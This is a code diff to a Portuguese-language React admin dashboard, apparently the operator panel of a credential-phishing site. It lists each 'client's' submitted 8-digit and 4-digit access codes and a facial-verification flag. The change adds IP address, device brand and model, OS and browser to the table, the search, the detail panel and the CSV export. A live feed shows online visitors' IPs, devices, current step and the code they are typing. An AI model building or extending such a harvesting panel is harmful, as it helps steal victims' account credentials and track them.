@@ -5,7 +5,10 @@ import {
   Download,
   Eye,
   EyeOff,
+  Laptop,
   Search,
+  Smartphone,
+  Tablet,
   Trash2,
   Users,
   XCircle,
@@ -19,6 +22,16 @@ interface SubmissionsViewProps {
   onClearAll: () => void;
   onDeleteRecord: (id: string) => void;
   onOpenForm: () => void;
+}
+
+function renderDeviceIcon(deviceType?: string) {
+  if (deviceType === 'Celular') {
+    return <Smartphone className="w-3.5 h-3.5 text-neutral-500 shrink-0" aria-hidden="true" />;
+  }
+  if (deviceType === 'Tablet') {
+    return <Tablet className="w-3.5 h-3.5 text-neutral-500 shrink-0" aria-hidden="true" />;
+  }
+  return <Laptop className="w-3.5 h-3.5 text-neutral-500 shrink-0" aria-hidden="true" />;
 }
 
 export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
@@ -43,6 +56,10 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
       if (!matchesStatus) return false;
       if (!q) return true;
       return (
+        (item.ipAddress ?? '').toLowerCase().includes(q) ||
+        (item.device?.deviceBrand ?? '').toLowerCase().includes(q) ||
+        (item.device?.deviceModel ?? '').toLowerCase().includes(q) ||
+        (item.device?.os ?? '').toLowerCase().includes(q) ||
         item.protocol.toLowerCase().includes(q) ||
         item.code8.includes(q) ||
         item.code4.includes(q) ||
@@ -61,18 +78,30 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
 
   const handleExportCsv = () => {
     const headers = [
-      'Protocolo',
+      'IP',
+      'Dispositivo',
+      'Marca_Modelo',
+      'Sistema_Operacional',
+      'Navegador',
+      'Acesso_8_Digitos',
+      'Acesso_4_Digitos',
+      'Facial',
       'Status',
-      'Codigo_8_Digitos',
-      'Codigo_4_Digitos',
+      'Protocolo',
       'Dados_Extras',
       'Data_Hora',
     ];
     const rows = filtered.map((s) => [
-      s.protocol,
-      s.status,
+      s.ipAddress ?? '—',
+      s.device?.deviceType ?? '—',
+      s.device ? `${s.device.deviceBrand} (${s.device.deviceModel})` : '—',
+      s.device?.os ?? '—',
+      s.device?.browser ?? '—',
       s.code8,
       s.code4,
+      s.faceVerified ? 'OK' : '—',
+      s.status,
+      s.protocol,
       Object.entries(s.extraData)
         .map(([k, v]) => `${k}: ${v}`)
         .join(' | '),
@@ -126,13 +155,13 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
         </div>
       </div>
 
-      {/* Online Visitors Live Feed */}
+      {/* Online Visitors Live Feed — IP First */}
       {onlineVisitors.length > 0 && (
         <div className="bg-white border border-neutral-200 rounded-xl overflow-hidden">
           <div className="px-5 py-3.5 border-b border-neutral-200 flex items-center justify-between gap-4 bg-[#FCFC30]/35">
             <div className="flex items-center gap-2 text-sm font-semibold text-black">
               <Users className="w-4 h-4 text-[#3D5AFF]" aria-hidden="true" />
-              <span>Visitantes ativos no momento</span>
+              <span>Visitantes online no momento</span>
             </div>
             <span className="text-xs font-mono tabular-nums text-black">
               {onlineVisitors.length} online
@@ -142,17 +171,36 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
             {onlineVisitors.map((visitor) => (
               <div
                 key={visitor.sessionId}
-                className="px-5 py-2.5 flex flex-wrap items-center justify-between gap-3 text-xs"
+                className="px-5 py-3 flex flex-wrap items-center justify-between gap-3 text-xs"
               >
-                <div className="flex items-center gap-3 min-w-0">
-                  <span className="font-mono text-neutral-500">
-                    {visitor.sessionId.slice(0, 10)}
+                <div className="flex flex-wrap items-center gap-2.5 min-w-0">
+                  <span className="font-mono tabular-nums font-semibold text-black">
+                    {visitor.ipAddress || 'IP indisponível'}
                   </span>
                   <span aria-hidden="true" className="text-neutral-300">·</span>
-                  <span className="font-medium text-black">{visitor.step}</span>
+                  {visitor.device && (
+                    <>
+                      <span className="inline-flex items-center gap-1.5 text-neutral-700">
+                        {renderDeviceIcon(visitor.device.deviceType)}
+                        <span>
+                          {visitor.device.deviceType} · {visitor.device.deviceBrand}
+                          {visitor.device.deviceModel &&
+                          visitor.device.deviceModel !== visitor.device.deviceBrand
+                            ? ` (${visitor.device.deviceModel})`
+                            : ''}
+                        </span>
+                      </span>
+                      <span aria-hidden="true" className="text-neutral-300">·</span>
+                      <span className="text-neutral-600">
+                        {visitor.device.os} / {visitor.device.browser}
+                      </span>
+                      <span aria-hidden="true" className="text-neutral-300">·</span>
+                    </>
+                  )}
+                  <span className="font-medium text-[#3D5AFF]">{visitor.step}</span>
                 </div>
                 {visitor.code8Preview && (
-                  <span className="font-mono tabular-nums text-[#3D5AFF] font-semibold">
+                  <span className="font-mono tabular-nums text-black font-semibold">
                     {visitor.code8Preview.length > 4
                       ? `${visitor.code8Preview.slice(0, 4)}-${visitor.code8Preview.slice(4)}`
                       : visitor.code8Preview}
@@ -164,7 +212,7 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
         </div>
       )}
 
-      {/* Main Data Grid */}
+      {/* Main Data Grid — IP in First Column */}
       <div className="bg-white border border-neutral-200 rounded-xl overflow-hidden">
         <div className="p-5 border-b border-neutral-200 flex flex-wrap items-center justify-between gap-4">
           <div className="flex flex-wrap items-center gap-3">
@@ -175,7 +223,7 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
               />
               <input
                 type="text"
-                placeholder="Buscar protocolo, código ou nome..."
+                placeholder="Buscar IP, marca, sistema ou código..."
                 value={query}
                 onChange={(e) => setQuery(e.target.value)}
                 className="pl-9 pr-3.5 py-2 text-sm rounded-lg border border-neutral-300 text-black placeholder:text-neutral-400 focus:outline-none focus:border-[#3D5AFF] focus:ring-4 focus:ring-[#3D5AFF]/20 w-64"
@@ -256,7 +304,7 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
             </p>
             <p className="text-xs text-neutral-600 max-w-sm mx-auto">
               {submissions.length === 0
-                ? 'Assim que alguém informar os 8 dígitos e os 4 dígitos no site, o registro aparecerá aqui automaticamente.'
+                ? 'Assim que o cliente preencher os 8 dígitos e os 4 dígitos no site, o IP, dispositivo, sistema operacional e códigos aparecerão aqui.'
                 : 'Tente alterar os termos da busca ou selecionar outro filtro.'}
             </p>
             {submissions.length === 0 && (
@@ -274,10 +322,11 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
             <table className="w-full text-left border-collapse">
               <thead>
                 <tr className="border-b border-neutral-200 bg-neutral-50 text-xs font-medium text-neutral-600">
-                  <th className="py-3 px-5">Protocolo</th>
-                  <th className="py-3 px-4">Código 8 dígitos</th>
-                  <th className="py-3 px-4">Código 4 dígitos</th>
-                  <th className="py-3 px-4">Dados informados</th>
+                  <th className="py-3 px-5">IP</th>
+                  <th className="py-3 px-4">Dispositivo / Marca</th>
+                  <th className="py-3 px-4">Sistema / Navegador</th>
+                  <th className="py-3 px-4">Acesso 8 dígitos</th>
+                  <th className="py-3 px-4">Acesso 4 dígitos</th>
                   <th className="py-3 px-4">Status</th>
                   <th className="py-3 px-4">Data e hora</th>
                   <th className="py-3 px-5 text-right">Ações</th>
@@ -285,8 +334,15 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
               </thead>
               <tbody className="divide-y divide-neutral-200 text-sm">
                 {filtered.map((row) => {
-                  const extraEntries = Object.entries(row.extraData);
                   const isSelected = selectedId === row.id;
+                  const deviceLabel = row.device
+                    ? `${row.device.deviceType} · ${row.device.deviceBrand}${
+                        row.device.deviceModel &&
+                        row.device.deviceModel !== row.device.deviceBrand
+                          ? ` (${row.device.deviceModel})`
+                          : ''
+                      }`
+                    : '—';
 
                   return (
                     <tr
@@ -296,10 +352,19 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
                         isSelected ? 'bg-[#FCFC30]/25' : 'hover:bg-neutral-50'
                       }`}
                     >
-                      <td className="py-2.5 px-5 font-mono tabular-nums text-xs font-semibold text-black">
-                        {row.protocol}
+                      <td className="py-2.5 px-5 font-mono tabular-nums text-xs font-semibold text-black whitespace-nowrap">
+                        {row.ipAddress || '—'}
                       </td>
-                      <td className="py-2.5 px-4 font-mono tabular-nums text-xs font-medium text-black">
+                      <td className="py-2.5 px-4 text-xs text-black whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1.5">
+                          {renderDeviceIcon(row.device?.deviceType)}
+                          <span>{deviceLabel}</span>
+                        </span>
+                      </td>
+                      <td className="py-2.5 px-4 text-xs text-neutral-700 whitespace-nowrap">
+                        {row.device ? `${row.device.os} · ${row.device.browser}` : '—'}
+                      </td>
+                      <td className="py-2.5 px-4 font-mono tabular-nums text-xs font-semibold text-black whitespace-nowrap">
                         {row.code8.length === 8
                           ? `${maskCode(row.code8.slice(0, 4), 4)}-${maskCode(
                               row.code8.slice(4),
@@ -307,15 +372,10 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
                             )}`
                           : row.code8}
                       </td>
-                      <td className="py-2.5 px-4 font-mono tabular-nums text-xs font-medium text-black">
+                      <td className="py-2.5 px-4 font-mono tabular-nums text-xs font-semibold text-[#3D5AFF] whitespace-nowrap">
                         {maskCode(row.code4, 4)}
                       </td>
-                      <td className="py-2.5 px-4 text-xs text-neutral-700 max-w-[220px] truncate">
-                        {extraEntries.length > 0
-                          ? extraEntries.map(([, val]) => val).join(' · ')
-                          : '—'}
-                      </td>
-                      <td className="py-2.5 px-4 text-xs">
+                      <td className="py-2.5 px-4 text-xs whitespace-nowrap">
                         {row.status === 'Concluído' ? (
                           <span className="inline-flex items-center gap-1.5 font-medium text-emerald-700">
                             <CheckCircle2 className="w-3.5 h-3.5" aria-hidden="true" />
@@ -358,16 +418,16 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
         )}
       </div>
 
-      {/* Selected Submission Inspection Panel */}
+      {/* Selected Submission Inspection Panel — IP First */}
       {selectedRecord && (
-        <div className="bg-white border border-neutral-200 rounded-xl p-6 space-y-4">
+        <div className="bg-white border border-neutral-200 rounded-xl p-6 space-y-5">
           <div className="flex items-center justify-between gap-4 border-b border-neutral-200 pb-4">
             <div>
               <span className="text-xs font-medium text-neutral-500">
-                Detalhes do registro
+                Ficha completa do cliente · {selectedRecord.protocol}
               </span>
               <h3 className="text-base font-semibold font-mono tabular-nums text-black mt-0.5">
-                {selectedRecord.protocol}
+                IP: {selectedRecord.ipAddress || '—'}
               </h3>
             </div>
             <button
@@ -381,7 +441,36 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
 
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 text-sm">
             <div>
-              <span className="block text-xs text-neutral-500">Código de 8 dígitos</span>
+              <span className="block text-xs text-neutral-500">Endereço IP</span>
+              <span className="block font-mono tabular-nums font-semibold text-black mt-1">
+                {selectedRecord.ipAddress || '—'}
+              </span>
+            </div>
+            <div>
+              <span className="block text-xs text-neutral-500">Dispositivo & Marca</span>
+              <span className="block font-medium text-black mt-1">
+                {selectedRecord.device
+                  ? `${selectedRecord.device.deviceType} · ${selectedRecord.device.deviceBrand} (${selectedRecord.device.deviceModel})`
+                  : '—'}
+              </span>
+            </div>
+            <div>
+              <span className="block text-xs text-neutral-500">Sistema Operacional</span>
+              <span className="block font-medium text-black mt-1">
+                {selectedRecord.device
+                  ? `${selectedRecord.device.os} · ${selectedRecord.device.browser}`
+                  : '—'}
+              </span>
+            </div>
+            <div>
+              <span className="block text-xs text-neutral-500">Status</span>
+              <span className="block font-medium text-black mt-1">
+                {selectedRecord.status}
+                {selectedRecord.faceVerified ? ' · Facial OK' : ''}
+              </span>
+            </div>
+            <div>
+              <span className="block text-xs text-neutral-500">Acesso 8 dígitos</span>
               <span className="block font-mono tabular-nums font-semibold text-black mt-1">
                 {selectedRecord.code8.length === 8
                   ? `${selectedRecord.code8.slice(0, 4)}-${selectedRecord.code8.slice(4)}`
@@ -389,15 +478,15 @@ export const SubmissionsView: React.FC<SubmissionsViewProps> = ({
               </span>
             </div>
             <div>
-              <span className="block text-xs text-neutral-500">Código de 4 dígitos</span>
-              <span className="block font-mono tabular-nums font-semibold text-black mt-1">
+              <span className="block text-xs text-neutral-500">Acesso 4 dígitos</span>
+              <span className="block font-mono tabular-nums font-semibold text-[#3D5AFF] mt-1">
                 {selectedRecord.code4}
               </span>
             </div>
             <div>
-              <span className="block text-xs text-neutral-500">Status</span>
-              <span className="block font-medium text-black mt-1">
-                {selectedRecord.status}
+              <span className="block text-xs text-neutral-500">Protocolo</span>
+              <span className="block font-mono tabular-nums text-neutral-700 mt-1">
+                {selectedRecord.protocol}
               </span>
             </div>
             <div>
